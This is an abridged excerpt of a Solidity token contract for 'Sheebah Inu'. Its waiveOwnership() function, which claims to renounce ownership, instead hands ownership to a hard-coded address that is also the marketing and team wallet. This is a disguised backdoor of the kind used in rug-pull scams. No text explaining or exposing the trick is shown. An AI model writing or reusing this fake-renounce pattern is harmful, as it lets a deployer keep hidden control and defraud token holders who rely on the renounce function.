...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xd6cFbd6D1413920292d0031e06EdAb33a3A7F8bB);
    }
...
contract SheebahInu is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Sheebah Inu";
    string private _symbol = "SHEEBAH INU";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xd6cFbd6D1413920292d0031e06EdAb33a3A7F8bB);
    address payable private teamWalletAddress = payable(0xd6cFbd6D1413920292d0031e06EdAb33a3A7F8bB);
